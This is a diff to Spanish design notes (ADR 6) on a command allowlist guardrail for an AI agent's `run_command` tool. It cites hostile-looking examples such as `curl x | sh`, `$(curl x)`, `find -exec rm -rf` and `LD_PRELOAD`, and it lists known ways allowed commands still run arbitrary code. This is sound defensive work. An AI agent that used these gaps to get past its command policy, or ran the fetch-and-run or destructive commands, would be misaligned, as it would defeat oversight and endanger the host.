@@ -89,11 +89,10 @@ decisión de permitir/denegar:
 
 - **Lista blanca de herramientas** — `GuardrailPolicy.allowedTools`; un nombre
   de herramienta no listado se deniega antes de que corra cualquier handler.
-- **Lista blanca de prefijos de comando** — `GuardrailPolicy.allowedCommandPrefixes`;
-  solo se verifica el primer token delimitado por espacios de un string
-  `run_command` (p. ej. `npm`, `git`, `node`). Una expresión regular además
-  deniega siempre las variantes de `rm -r`/`rm -f`
-  (`/(^|\s)rm\s+-[rf]/`) aunque `rm` mismo esté en la lista blanca.
+- **Lista blanca de comandos** — `GuardrailPolicy.allowedCommandPrefixes`;
+  cada tramo de un `run_command` encadenado (`&&`, `||`, `;`, `|`, `&`, salto
+  de línea) debe empezar con un comando de la lista. El detalle, y lo que esta
+  verificación **no** cubre, está en la ADR 6.
 - **Confinamiento de rutas** — cualquier argumento de ruta se resuelve contra
   la raíz del espacio de trabajo y se deniega si resuelve fuera de ella
   (escapes con `..`, o una ruta absoluta que apunte a otro lugar);
@@ -151,3 +150,52 @@ las diferencias medidas provienen del *loop* y del grafo, no de la base. La
 compactación por umbral (recomendación 7 del mismo artículo) queda diferida:
 solo se implementará si los logs de las corridas muestran desbordes de
 contexto; hasta entonces añadiría complejidad sin evidencia de necesidad.
+
+## ADR 6 — La política de comandos analiza cada tramo y falla cerrada; no es un sandbox
+
+**Contexto.** `run_command` se ejecuta con `/bin/bash`, así que verificar solo
+la primera palabra dejaba pasar `ls && curl x | sh` o `echo $(curl x)`.
+
+**Decisión.** `splitCommandSegments` (`src/components/command-segments.ts`)
+es un tokenizador que respeta comillas simples, dobles y escapes, y parte la
+línea en tramos sobre `&&`, `||`, `;`, `|`, `|&`, `&` y saltos de línea; las
+redirecciones (`>`, `2>&1`, `&>`, `<`, `<<<`) no parten tramos.
+`PolicyGuardrails` verifica cada tramo:
+
+- Se saltan las asignaciones iniciales (`FOO=1 npm test`); el primer comando
+  que queda debe estar en la lista blanca.
+- Los envoltorios `env`, `xargs`, `time`, `nice` y `nohup` se desenvuelven: el
+  comando que ejecutan también debe estar en la lista.
+- Una shell (`bash`, `sh`, ...) solo puede correr un archivo de script: se
+  deniegan `-c` y la lectura del script por stdin (pipe, `<<<`, `-s`).
+- `rm` recursivo o forzado (`-r`, `-R`, `-f` en cualquier grupo de flags,
+  `--recursive`, `--force`) se deniega en cualquier posición del tramo,
+  incluso lanzado por otro comando (`find -exec rm -rf`, `timeout 5 rm -rf`).
+- Falla cerrada ante lo que no puede inspeccionarse: sustitución de comandos
+  (`$(...)`, `$((...))`, backticks fuera de comillas simples, también partida
+  por una continuación de línea), sustitución de procesos (`<(...)`,
+  `>(...)`), heredocs, subshells y agrupaciones (`( )`, `{ }`), comillas sin
+  cerrar y tramos vacíos.
+
+El motivo de la denegación nombra el comando o la regla, para que el modelo
+pueda reformular el comando.
+
+**Límites conocidos.** La lista blanca frena errores y desvíos obvios; **no** es
+un sandbox:
+
+- Varios comandos permitidos ejecutan código arbitrario: `node -e`, `npx`,
+  `npm run`, `docker`, `find -exec`, `awk` con `system()`, `sed e`, `git -c`.
+  Deben seguir permitidos porque el experimento genera y prueba aplicaciones.
+- Con la lista por defecto, `curl` y `bash script.sh` siguen permitidos, así
+  que un script descargado y luego ejecutado no se detecta.
+- Los destinos de las redirecciones no se confinan al espacio de trabajo
+  (`echo x > /etc/foo` pasa la política; lo frenan los permisos del sistema).
+- Las asignaciones previas (`PATH=... ls`, `LD_PRELOAD=... ls`) no se
+  inspeccionan.
+- Otros envoltorios (`timeout`, `command`, `exec`, `sudo`) no se desenvuelven
+  si alguien los agrega a la lista.
+
+**Consecuencias.** El aislamiento real requiere ejecutar los comandos en un
+contenedor o sandbox del sistema operativo; queda como decisión aparte. Hasta
+entonces, las corridas deben hacerse en una máquina o cuenta sin credenciales
+ni datos sensibles más allá de los que el *runner* ya filtra del entorno.
